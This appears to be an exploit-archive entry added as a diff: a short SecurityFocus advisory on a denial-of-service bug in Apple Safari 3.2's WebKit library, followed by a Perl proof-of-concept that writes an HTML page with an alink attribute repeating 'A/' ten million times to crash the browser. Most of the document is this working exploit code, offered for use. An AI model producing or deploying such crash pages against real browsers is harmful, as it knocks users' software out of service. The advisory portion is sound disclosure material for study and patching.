@@ -1,0 +1,39 @@
+source: http://www.securityfocus.com/bid/33080/info
+
+Apple Safari is prone to a denial-of-service vulnerability that resides in the WebKit library.
+
+Remote attackers can exploit this issue to crash the affected browser, denial-of-service condition.
+
+Apple Safari 3.2 running on Microsoft Windows Vista is vulnerable; other versions running on different platforms may also be affected.
+
+Note (December 20, 2010): Safari on iOS 4.0.1 is also vulnerable.
+
+#!/usr/bin/perl
+# safari_webkit_ml.pl
+# Safari (Webkit) 3.2 Remote Memory Leak Exploit
+# Jeremy Brown [0xjbrown41@gmail.com/jbrownsec.blogspot.com]
+# Access violation when writing to [00000018]
+# EIP 6B00A02B WebKit.6B00A02B
+# LastError 00000008 ERROR_NOT_ENOUGH_MEMORY
+# Memory leaks are common in browsers.. tested on Vista SP1
+# Compliments of bf2
+
+$filename = $ARGV[0];
+if(!defined($filename))
+{
+
+     print "Usage: $0 <filename.html>\n";
+
+}
+
+$head = "<html>" . "\n";
+$trig = "<body alink=\"" . "A/" x 10000000 . "\">" . "\n";
+$foot = "</html>";
+
+$data = $head . $trig . $foot;
+
+     open(FILE, '>' . $filename);
+     print FILE $data;
+     close(FILE);
+
+exit;
